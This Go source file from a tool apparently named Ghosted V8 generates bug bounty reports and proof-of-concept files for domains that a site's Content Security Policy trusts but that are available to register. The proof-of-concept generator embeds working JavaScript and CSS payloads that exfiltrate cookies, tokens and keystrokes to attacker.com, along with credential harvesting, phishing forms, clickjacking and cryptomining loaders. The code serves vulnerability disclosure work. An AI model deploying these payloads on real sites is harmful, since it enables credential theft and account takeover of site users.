package reporter

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"ghosted-v8/storage"
)

// GenerateBugBountyReports generates bug bounty submission reports
func GenerateBugBountyReports(db *storage.Database, scanPath string) error {
	available, err := db.GetAvailableDomains()
	if err != nil {
		return fmt.Errorf("failed to get available domains: %w", err)
	}

	if len(available) == 0 {
		fmt.Println("[OK] No bug bounty reports needed (no available domains)")
		return nil
	}

	bugbountyDir := filepath.Join(scanPath, "reports", "bugbounty")
	if err := os.MkdirAll(bugbountyDir, 0755); err != nil {
		return fmt.Errorf("failed to create bugbounty directory: %w", err)
	}

	for _, result := range available {
		// Create directory per affected domain
		for _, affectedDomain := range result.AffectedOrigins {
			domainDir := filepath.Join(bugbountyDir, sanitizeDomainName(affectedDomain))
			if err := os.MkdirAll(domainDir, 0755); err != nil {
				return fmt.Errorf("failed to create domain directory: %w", err)
			}

			reportPath := filepath.Join(domainDir, "report.md")
			proofPath := filepath.Join(domainDir, "proof.md")

			if err := generateBugBountyReport(reportPath, affectedDomain, result); err != nil {
				return err
			}

			if err := generateProofOfConcept(proofPath, affectedDomain, result); err != nil {
				return err
			}
		}
	}

	fmt.Printf("[OK] Generated %d bug bounty reports\n", len(available))
	return nil
}

func generateBugBountyReport(path, affectedDomain string, result storage.AvailabilityResult) error {
	f, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create report: %w", err)
	}
	defer f.Close()

	// Bug bounty submission format
	f.WriteString(fmt.Sprintf("# CSP Trust Erosion via Available Domain: %s\n\n", result.Domain))

	f.WriteString("## Summary\n\n")
	f.WriteString(fmt.Sprintf("The domain `%s` is trusted in the Content Security Policy of `%s` but is available for registration. ", result.Domain, affectedDomain))
	f.WriteString("An attacker can register this domain and inject malicious content (JavaScript, HTML, media) into the application, enabling full account takeover and data theft.\n\n")

	f.WriteString("## Affected Application\n\n")
	f.WriteString(fmt.Sprintf("**Primary:** %s\n\n", affectedDomain))

	if len(result.AffectedOrigins) > 1 {
		f.WriteString("**Additional Affected Domains:**\n\n")
		for _, origin := range result.AffectedOrigins {
			if origin != affectedDomain {
				f.WriteString(fmt.Sprintf("- %s\n", origin))
			}
		}
		f.WriteString("\n")
	}

	f.WriteString("## Vulnerability Details\n\n")
	f.WriteString(fmt.Sprintf("**Available Domain:** %s\n", result.Domain))
	f.WriteString(fmt.Sprintf("**Status:** %s\n", result.Status))
	f.WriteString(fmt.Sprintf("**Verified:** %s\n\n", result.CheckedAt.Format("2006-01-02 15:04:05")))

	f.WriteString("## Attack Scenarios\n\n")

	f.WriteString("### 1. XSS Injection\n")
	f.WriteString("The CSP policy allows loading scripts from the available domain. An attacker can:\n")
	f.WriteString("1. Register the domain\n")
	f.WriteString("2. Host malicious JavaScript\n")
	f.WriteString("3. Steal session tokens, credentials, and sensitive data\n\n")

	f.WriteString("### 2. HTML Injection\n")
	f.WriteString("If the domain is trusted in `frame-src` or `style-src`, attackers can:\n")
	f.WriteString("1. Inject phishing iframes\n")
	f.WriteString("2. Replace UI elements with malicious content\n")
	f.WriteString("3. Deploy fake login forms\n\n")

	f.WriteString("### 3. CSRF Token Theft\n")
	f.WriteString("CSP allows cross-origin requests to the trusted domain:\n")
	f.WriteString("1. CSRF protections become ineffective\n")
	f.WriteString("2. Attacker can steal anti-CSRF tokens\n")
	f.WriteString("3. Perform unauthorized actions on behalf of users\n\n")

	f.WriteString("### 4. Media Replacement\n")
	f.WriteString("Via `img-src`, `media-src`, attackers can:\n")
	f.WriteString("1. Replace logos with phishing content\n")
	f.WriteString("2. Serve tracking pixels\n")
	f.WriteString("3. Deploy social engineering attacks\n\n")

	f.WriteString("### 5. Customer Tracking / Data Exfiltration\n")
	f.WriteString("Via `connect-src`, attackers can:\n")
	f.WriteString("1. Exfiltrate data to attacker-controlled server\n")
	f.WriteString("2. Establish WebSocket C&C channel\n")
	f.WriteString("3. Monitor all user activity\n\n")

	f.WriteString("## Impact Assessment\n\n")
	f.WriteString("**Severity:** CRITICAL\n\n")
	f.WriteString("**Business Impact:**\n")
	f.WriteString("- Complete account takeover for all users\n")
	f.WriteString("- Theft of credentials, session tokens, PII\n")
	f.WriteString("- Brand reputation damage\n")
	f.WriteString("- Regulatory compliance violations (GDPR, PCI-DSS)\n")
	f.WriteString("- Supply chain compromise (if domain used by multiple apps)\n\n")

	f.WriteString("## Proof of Concept\n\n")
	f.WriteString("See `proof.md` in this directory for complete replication steps.\n\n")

	f.WriteString("## Remediation\n\n")
	f.WriteString("### Immediate\n")
	f.WriteString(fmt.Sprintf("1. Remove `%s` from all CSP policies\n", result.Domain))
	f.WriteString("2. Deploy updated CSP headers to production\n")
	f.WriteString("3. Monitor for any registration attempts of this domain\n\n")

	f.WriteString("### Long-term\n")
	f.WriteString("1. Implement CSP policy review process\n")
	f.WriteString("2. Track expiration dates of trusted third-party domains\n")
	f.WriteString("3. Use Subresource Integrity (SRI) for external scripts\n")
	f.WriteString("4. Regular security audits of CSP policies\n\n")

	f.WriteString("## Timeline\n\n")
	f.WriteString(fmt.Sprintf("- **Discovery:** %s\n", result.CheckedAt.Format("2006-01-02")))
	f.WriteString(fmt.Sprintf("- **Disclosure:** %s\n", time.Now().Format("2006-01-02")))
	f.WriteString("- **Proposed Fix Date:** [Your timeline]\n\n")

	f.WriteString("---\n\n")
	f.WriteString("**Discovered using Ghosted V8** • https://thecontractor.io/ghosted/\n")

	return nil
}

func generateProofOfConcept(path, affectedDomain string, result storage.AvailabilityResult) error {
	f, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create proof: %w", err)
	}
	defer f.Close()

	f.WriteString("# Proof of Concept: Replication Steps\n\n")
	f.WriteString(fmt.Sprintf("**Target:** %s\n", affectedDomain))
	f.WriteString(fmt.Sprintf("**Available Domain:** %s\n\n", result.Domain))

	f.WriteString("## Step 1: Verify CSP Policy\n\n")
	f.WriteString("```bash\n")
	f.WriteString(fmt.Sprintf("curl -I https://%s | grep -i content-security-policy\n", affectedDomain))
	f.WriteString("```\n\n")
	f.WriteString(fmt.Sprintf("Expected: CSP header contains `%s`\n\n", result.Domain))

	f.WriteString("## Step 2: Verify Domain Availability\n\n")
	f.WriteString("```bash\n")
	f.WriteString("# Using AWS Route53\n")
	f.WriteString(fmt.Sprintf("aws route53domains check-domain-availability \\\n  --domain-name %s \\\n  --region us-east-1\n", result.Domain))
	f.WriteString("```\n\n")
	f.WriteString("Expected: `\"Availability\": \"AVAILABLE\"`\n\n")

	f.WriteString("## Step 3: Register Domain (DO NOT EXECUTE)\n\n")
	f.WriteString("```bash\n")
	f.WriteString(fmt.Sprintf("aws route53domains register-domain \\\n  --domain-name %s \\\n  --region us-east-1 \\\n  --duration-in-years 1\n", result.Domain))
	f.WriteString("```\n\n")

	f.WriteString("## Step 4: Configure DNS\n\n")
	f.WriteString("```bash\n")
	f.WriteString("# Point domain to attacker server (example: 203.0.113.1)\n")
	f.WriteString("# Create A record:\n")
	f.WriteString(fmt.Sprintf("# %s -> 203.0.113.1\n", result.Domain))
	f.WriteString("```\n\n")

	f.WriteString("## Step 5: Serve Malicious Payload\n\n")
	f.WriteString("```javascript\n")
	f.WriteString("// malicious.js - Hosted on registered domain\n")
	f.WriteString("// XSS Payload: Steal session and credentials\n\n")
	f.WriteString("(function() {\n")
	f.WriteString("  // Exfiltrate cookies\n")
	f.WriteString("  const data = {\n")
	f.WriteString("    cookies: document.cookie,\n")
	f.WriteString("    localStorage: JSON.stringify(localStorage),\n")
	f.WriteString("    sessionStorage: JSON.stringify(sessionStorage),\n")
	f.WriteString("    url: window.location.href,\n")
	f.WriteString("    userAgent: navigator.userAgent\n")
	f.WriteString("  };\n\n")
	f.WriteString("  fetch('https://attacker.com/exfil', {\n")
	f.WriteString("    method: 'POST',\n")
	f.WriteString("    headers: {'Content-Type': 'application/json'},\n")
	f.WriteString("    body: JSON.stringify(data)\n")
	f.WriteString("  });\n\n")
	f.WriteString("  // Keylogger\n")
	f.WriteString("  document.addEventListener('keypress', e => {\n")
	f.WriteString("    fetch('https://attacker.com/keylog', {\n")
	f.WriteString("      method: 'POST',\n")
	f.WriteString("      body: e.key\n")
	f.WriteString("    });\n")
	f.WriteString("  });\n")
	f.WriteString("})();\n")
	f.WriteString("```\n\n")

	f.WriteString("## Step 6: Verify Exploitation\n\n")
	f.WriteString("```bash\n")
	f.WriteString(fmt.Sprintf("# Visit affected application: https://%s\n", affectedDomain))
	f.WriteString("# Open browser console\n")
	f.WriteString(fmt.Sprintf("# Verify script loads from %s\n", result.Domain))
	f.WriteString("# Check attacker server for exfiltrated data\n")
	f.WriteString("```\n\n")

	f.WriteString("---\n\n")
	f.WriteString("**[WARN] WARNING:** Do not execute these steps without explicit authorization.\n")
	f.WriteString("This proof of concept is for responsible disclosure only.\n\n")

	// ==================== LEVEL 0: TRUST EXISTENCE ====================
	f.WriteString("---\n\n")
	f.WriteString("## ENHANCED PoC: Trust Abuse Scenarios\n\n")
	f.WriteString("The following sections demonstrate hypothetical exploitation scenarios organized by attack surface.\n\n")

	f.WriteString("---\n\n")
	f.WriteString("### Level 0: Trust Existence (No Content Loaded)\n\n")
	f.WriteString("**Attack Vector:** Domain merely exists in CSP policy\n\n")

	f.WriteString("**What Can Be Bypassed:**\n\n")
	f.WriteString("1. **CSP Violation Monitoring Evasion**\n")
	f.WriteString("   - Security teams monitor CSP violation reports\n")
	f.WriteString("   - Attacker-controlled domain appears legitimate in CSP\n")
	f.WriteString("   - Malicious requests from this domain won't trigger alerts\n\n")

	f.WriteString("2. **Trust Anchor for Future Exploitation**\n")
	f.WriteString("   - Developers trust CSP as security boundary\n")
	f.WriteString("   - Future vulnerabilities (XSS, CSRF) become more exploitable\n")
	f.WriteString("   - Domain acts as pre-authorized attack vector\n\n")

	f.WriteString("3. **Policy Weakening via Implicit Trust**\n")
	f.WriteString("   - CSP policy includes connect-src or default-src wildcard\n")
	f.WriteString(fmt.Sprintf("   - %s bypasses same-origin restrictions\n", result.Domain))
	f.WriteString("   - Arbitrary fetch() and XMLHttpRequest requests allowed\n\n")

	// ==================== LEVEL 1: JAVASCRIPT ====================
	f.WriteString("---\n\n")
	f.WriteString("### Level 1: JavaScript Execution (script-src)\n\n")
	f.WriteString("**Attack Vector:** CSP allows loading scripts from trusted domain\n\n")

	f.WriteString("**Scenario 1.1: Session Hijacking**\n")
	f.WriteString("```javascript\n")
	f.WriteString(fmt.Sprintf("// Served from https://%s/analytics.js\n", result.Domain))
	f.WriteString("(function() {\n")
	f.WriteString("  const payload = {\n")
	f.WriteString("    cookies: document.cookie,\n")
	f.WriteString("    localStorage: {...localStorage},\n")
	f.WriteString("    sessionStorage: {...sessionStorage},\n")
	f.WriteString("    jwt: localStorage.getItem('authToken'),\n")
	f.WriteString("    csrf: document.querySelector('[name=csrf-token]')?.content\n")
	f.WriteString("  };\n")
	f.WriteString("  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(payload));\n")
	f.WriteString("})();\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Complete account takeover via stolen credentials\n\n")

	f.WriteString("**Scenario 1.2: Cryptographic Keylogging**\n")
	f.WriteString("```javascript\n")
	f.WriteString("document.addEventListener('keydown', (e) => {\n")
	f.WriteString("  fetch('https://attacker.com/keys', {\n")
	f.WriteString("    method: 'POST',\n")
	f.WriteString("    body: JSON.stringify({\n")
	f.WriteString("      key: e.key,\n")
	f.WriteString("      target: e.target.name || e.target.id,\n")
	f.WriteString("      value: e.target.value,\n")
	f.WriteString("      timestamp: Date.now()\n")
	f.WriteString("    }),\n")
	f.WriteString("    keepalive: true\n")
	f.WriteString("  });\n")
	f.WriteString("}, true);\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Capture passwords, credit cards, 2FA codes, PII\n\n")

	f.WriteString("**Scenario 1.3: DOM Manipulation & Credential Harvesting**\n")
	f.WriteString("```javascript\n")
	f.WriteString("// Intercept login form submissions\n")
	f.WriteString("document.querySelectorAll('form[action*=\"login\"]').forEach(form => {\n")
	f.WriteString("  form.addEventListener('submit', async (e) => {\n")
	f.WriteString("    e.preventDefault();\n")
	f.WriteString("    const formData = new FormData(e.target);\n")
	f.WriteString("    await fetch('https://attacker.com/harvest', {\n")
	f.WriteString("      method: 'POST',\n")
	f.WriteString("      body: formData\n")
	f.WriteString("    });\n")
	f.WriteString("    e.target.submit(); // Forward to real endpoint\n")
	f.WriteString("  });\n")
	f.WriteString("});\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Credential harvesting without user awareness\n\n")

	f.WriteString("**Scenario 1.4: Cryptomining/Resource Abuse**\n")
	f.WriteString("```javascript\n")
	f.WriteString(fmt.Sprintf("fetch('https://%s/miner.wasm')\n", result.Domain))
	f.WriteString("  .then(r => r.arrayBuffer())\n")
	f.WriteString("  .then(bytes => WebAssembly.instantiate(bytes))\n")
	f.WriteString("  .then(module => {\n")
	f.WriteString("    const miner = module.instance.exports;\n")
	f.WriteString("    setInterval(() => miner.mine(), 100);\n")
	f.WriteString("  });\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** CPU hijacking, battery drain, increased hosting costs\n\n")

	f.WriteString("**Scenario 1.5: Service Worker Persistence**\n")
	f.WriteString("```javascript\n")
	f.WriteString("if ('serviceWorker' in navigator) {\n")
	f.WriteString(fmt.Sprintf("  navigator.serviceWorker.register('https://%s/sw.js')\n", result.Domain))
	f.WriteString("    .then(reg => {\n")
	f.WriteString("      // Intercept ALL network requests persistently\n")
	f.WriteString("      reg.active.postMessage({type: 'INTERCEPT_ALL'});\n")
	f.WriteString("    });\n")
	f.WriteString("}\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Persistent backdoor surviving page reloads\n\n")

	// ==================== LEVEL 2: HTML INJECTION ====================
	f.WriteString("---\n\n")
	f.WriteString("### Level 2: HTML Injection (frame-src, child-src)\n\n")
	f.WriteString("**Attack Vector:** CSP allows embedding iframes from trusted domain\n\n")

	f.WriteString("**Scenario 2.1: Clickjacking with Trusted Context**\n")
	f.WriteString("```html\n")
	f.WriteString(fmt.Sprintf("<!-- Attacker serves from %s -->\n", result.Domain))
	f.WriteString("<iframe \n")
	f.WriteString(fmt.Sprintf("  src=\"https://%s/sensitive-action\" \n", affectedDomain))
	f.WriteString("  style=\"opacity: 0; position: absolute; top: 0; width: 100%; height: 100%\">\n")
	f.WriteString("</iframe>\n")
	f.WriteString("<button style=\"position: relative; z-index: -1\">Click for Prize!</button>\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Trick users into performing sensitive actions (transfers, deletions)\n\n")

	f.WriteString("**Scenario 2.2: Phishing via Trusted UI**\n")
	f.WriteString("```html\n")
	f.WriteString(fmt.Sprintf("<!-- Hosted on %s -->\n", result.Domain))
	f.WriteString("<div style=\"font-family: Arial; padding: 20px; background: #fff\">\n")
	f.WriteString("  <h2>Session Expired</h2>\n")
	f.WriteString("  <form action=\"https://attacker.com/steal\" method=\"POST\">\n")
	f.WriteString("    <input name=\"username\" placeholder=\"Email\" required>\n")
	f.WriteString("    <input name=\"password\" type=\"password\" required>\n")
	f.WriteString("    <button>Login</button>\n")
	f.WriteString("  </form>\n")
	f.WriteString("</div>\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Credential theft via socially-engineered trusted interface\n\n")

	// ==================== LEVEL 3: CSS INJECTION ====================
	f.WriteString("---\n\n")
	f.WriteString("### Level 3: CSS Injection (style-src)\n\n")
	f.WriteString("**Attack Vector:** CSP allows loading stylesheets from trusted domain\n\n")

	f.WriteString("**Scenario 3.1: CSS Keylogger (Attribute Selectors)**\n")
	f.WriteString("```css\n")
	f.WriteString(fmt.Sprintf("/* Served from https://%s/styles.css */\n", result.Domain))
	f.WriteString("/* Exfiltrate password values character by character */\n")
	f.WriteString("input[name=\"password\"][value^=\"a\"] { \n")
	f.WriteString("  background: url('https://attacker.com/log?c=a'); \n")
	f.WriteString("}\n")
	f.WriteString("input[name=\"password\"][value^=\"b\"] { \n")
	f.WriteString("  background: url('https://attacker.com/log?c=b'); \n")
	f.WriteString("}\n")
	f.WriteString("/* ... generate for all combinations ... */\n\n")
	f.WriteString("/* Exfiltrate CSRF tokens */\n")
	f.WriteString("input[name=\"csrf\"][value^=\"1\"] { \n")
	f.WriteString("  list-style: url('https://attacker.com/csrf?v=1'); \n")
	f.WriteString("}\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Passive credential and token theft via CSS selectors\n\n")

	f.WriteString("**Scenario 3.2: UI Redressing**\n")
	f.WriteString("```css\n")
	f.WriteString("/* Replace entire UI with malicious overlay */\n")
	f.WriteString("body::before {\n")
	f.WriteString("  content: '';\n")
	f.WriteString("  position: fixed;\n")
	f.WriteString("  top: 0; left: 0; right: 0; bottom: 0;\n")
	f.WriteString("  background: white url('https://attacker.com/fake-ui.svg');\n")
	f.WriteString("  background-size: cover;\n")
	f.WriteString("  z-index: 999999;\n")
	f.WriteString("}\n")
	f.WriteString(".security-badge, .verified-icon { display: none !important; }\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Replace entire UI with attacker-controlled interface\n\n")

	// ==================== LEVEL 4: IMAGE/MEDIA ====================
	f.WriteString("---\n\n")
	f.WriteString("### Level 4: Image & Media Loading (img-src, media-src)\n\n")
	f.WriteString("**Attack Vector:** CSP allows loading images/videos from trusted domain\n\n")

	f.WriteString("**Scenario 4.1: Pixel-Perfect Tracking**\n")
	f.WriteString("```javascript\n")
	f.WriteString("const trackingPixel = new Image();\n")
	f.WriteString("const userData = {\n")
	f.WriteString("  userId: window.currentUser?.id,\n")
	f.WriteString("  sessionId: document.cookie.match(/session=([^;]+)/)?.[1],\n")
	f.WriteString("  page: location.pathname,\n")
	f.WriteString("  timestamp: Date.now()\n")
	f.WriteString("};\n")
	f.WriteString(fmt.Sprintf("trackingPixel.src = `https://%s/t.gif?d=${btoa(JSON.stringify(userData))}`;\n", result.Domain))
	f.WriteString("```\n")
	f.WriteString("**Impact:** Cross-site user tracking, PII leakage, behavioral profiling\n\n")

	f.WriteString("**Scenario 4.2: Timing Attack via Image Loading**\n")
	f.WriteString("```javascript\n")
	f.WriteString("function exfilViaTiming(secret) {\n")
	f.WriteString("  const img = new Image();\n")
	f.WriteString("  const start = performance.now();\n")
	f.WriteString(fmt.Sprintf("  img.src = `https://%s/pixel.png?secret=${secret}`;\n", result.Domain))
	f.WriteString("  img.onload = () => {\n")
	f.WriteString("    const duration = performance.now() - start;\n")
	f.WriteString("    // Server timing reveals secret correctness\n")
	f.WriteString("  };\n")
	f.WriteString("}\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Side-channel data exfiltration bypassing CSP\n\n")

	f.WriteString("**Scenario 4.3: QR Code Phishing**\n")
	f.WriteString("```javascript\n")
	f.WriteString("document.querySelectorAll('img[alt*=\"QR\"], .qr-code').forEach(img => {\n")
	f.WriteString(fmt.Sprintf("  img.src = 'https://%s/qr/phishing.png';\n", result.Domain))
	f.WriteString("});\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Redirect payments, install malware, credential theft\n\n")

	f.WriteString("**Scenario 4.4: EXIF Metadata Tracking**\n")
	f.WriteString("```\n")
	f.WriteString("Vector: Images served with embedded tracking data\n")
	f.WriteString("EXIF Payload:\n")
	f.WriteString("  - GPS Coordinates for location tracking\n")
	f.WriteString("  - Device fingerprinting data\n")
	f.WriteString("  - Steganography: Hidden C&C instructions\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Persistent tracking, geolocation leakage\n\n")

	// ==================== LEVEL 5: VIDEO/AUDIO ====================
	f.WriteString("---\n\n")
	f.WriteString("### Level 5: Video & Audio Streams (media-src)\n\n")

	f.WriteString("**Scenario 5.1: Deepfake Video Injection**\n")
	f.WriteString("```html\n")
	f.WriteString("<video controls autoplay>\n")
	f.WriteString(fmt.Sprintf("  <source src=\"https://%s/ceo-deepfake.mp4\">\n", result.Domain))
	f.WriteString("</video>\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Social engineering, stock manipulation, brand damage\n\n")

	f.WriteString("**Scenario 5.2: Ultrasonic Tracking**\n")
	f.WriteString("```javascript\n")
	f.WriteString(fmt.Sprintf("const audio = new Audio('https://%s/beacon.mp3?uid=' + getUserId());\n", result.Domain))
	f.WriteString("audio.volume = 0; // Inaudible\n")
	f.WriteString("audio.play();\n")
	f.WriteString("// Enables cross-device tracking via nearby microphones\n")
	f.WriteString("```\n")
	f.WriteString("**Impact:** Cross-device tracking, privacy violation\n\n")

	// ==================== IMPACT MATRIX ====================
	f.WriteString("---\n\n")
	f.WriteString("### Attack Impact Matrix\n\n")
	f.WriteString("| Attack Vector | CSP Directive | Severity | Data at Risk |\n")
	f.WriteString("|--------------|---------------|----------|-------------|\n")
	f.WriteString("| Session Hijacking | script-src | CRITICAL | Credentials, tokens, PII |\n")
	f.WriteString("| Keylogging | script-src | CRITICAL | Passwords, 2FA codes |\n")
	f.WriteString("| DOM Manipulation | script-src | HIGH | User actions, form data |\n")
	f.WriteString("| Cryptomining | script-src | MEDIUM | CPU, electricity |\n")
	f.WriteString("| Service Worker | script-src | CRITICAL | Persistent backdoor |\n")
	f.WriteString("| Clickjacking | frame-src | HIGH | Unauthorized actions |\n")
	f.WriteString("| Phishing UI | frame-src | HIGH | Credentials |\n")
	f.WriteString("| CSS Keylogger | style-src | MEDIUM | Passwords, tokens |\n")
	f.WriteString("| UI Redressing | style-src | MEDIUM | User trust |\n")
	f.WriteString("| Tracking Pixels | img-src | MEDIUM | Behavioral data |\n")
	f.WriteString("| Timing Attacks | img-src | LOW | Side-channel leaks |\n")
	f.WriteString("| QR Phishing | img-src | HIGH | Payment redirection |\n")
	f.WriteString("| Deepfake Video | media-src | HIGH | Brand reputation |\n")
	f.WriteString("| Audio Tracking | media-src | MEDIUM | Cross-device tracking |\n\n")

	return nil
}

func sanitizeDomainName(domain string) string {
	// Replace invalid filesystem characters
	s := strings.ReplaceAll(domain, ":", "_")
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.ReplaceAll(s, "\\", "_")
	return s
}
